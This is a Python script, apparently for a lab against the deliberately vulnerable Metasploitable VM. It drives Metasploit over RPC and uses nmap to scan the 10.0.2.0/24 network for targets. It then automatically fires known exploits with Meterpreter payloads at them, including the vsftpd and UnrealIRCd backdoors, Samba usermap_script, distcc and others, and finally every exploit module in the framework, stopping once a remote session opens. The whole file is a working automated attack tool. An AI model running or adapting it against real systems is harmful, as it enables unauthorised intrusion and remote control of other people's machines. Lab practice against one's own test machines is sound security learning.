from sys import argv
from typing import Protocol
from pymetasploit3.msfrpc import *
import nmap
import time
 
# Connect to RPC client
# if len(argv) <= 1:
#     print('Please provide RPC password as an argument')
#     exit(1)
 
try:
    print('Connecting to client...')
    client = MsfRpcClient("mypassword", port=55552)
    print('Connection successful')
 
except:
    print('Error connecting to client: ensure that RPC client is running on port 55552 and password is correct')
 
# Scan local network range using nmap
print('Beginning scan of network...')
nm = nmap.PortScanner()
nm.scan(hosts='10.0.2.0/24', arguments='-PA22,80,433')
data = nm.get_nmap_last_output()
 
# Import scan into Metasploit database
workspace = Workspace(client, 'default')
workspace.importdata(data)
hosts = workspace.hosts.records('hosts')
services = workspace.services.records('services')

# Identify Metasploitable instances
targets = []
for service in services:
    if "Metasploitable" in service["info"]:
        targets += [service["host"]]
print(f'Scan complete: {len(hosts)} hosts found on network, {len(targets)} are targets')

# Variables for exploitation loop
timeout = 30
buffer = 5
topExploits = ['unix/ftp/vsftpd_234_backdoor','multi/http/php_cgi_arg_injection','multi/samba/usermap_script','multi/misc/java_rmi_server','linux/postgres/postgres_payload','unix/irc/unreal_ircd_3281_backdoor','unix/misc/distcc_exec']

# Loop through targets, attempting to exploit each with likely exploits
def attemptExploit(target, exploits):
    try:
        count = 0
        pwned = len(client.sessions.list)
        startTime = time.time()
        # Loop through all exploits using Meterpreter payloads
        for e in exploits:
            exploit = client.modules.use('exploit', e)
            try:
                for p in exploit.targetpayloads():
                    if 'meterpreter' in p:
                        # Set host option to be target hostname
                        try:
                            exploit['RHOST'] = target
                        except KeyError:
                            try:
                                exploit['RHOSTS'] = target
                            except KeyError:
                                continue
                        count+=1
                        print(f'Attempting attack {count} against {target} - exploit {e} with payload {p}')
                        job = exploit.execute(payload=p)
                        jobID = job['job_id']
                        startTime = time.time()
                        while(str(jobID) in list(client.jobs.list.keys())):
                            # Wait for job to succeed, fail, or timeout
                            if time.time() - startTime >= timeout:
                                client.jobs.stop(jobID)
                                break
                            #time.sleep(buffer)

                        # If attack has succeeded on target, stop
                        if len(client.sessions.list) > pwned:
                            pwned = len(client.sessions.list)
                            raise StopIteration

            except ValueError:
                pass

    except StopIteration:
        pass


attemptExploit(targets[0], client.modules.exploits)

print(client.sessions.list)

# while(True):
#     cmd = input()
#     if cmd == ''
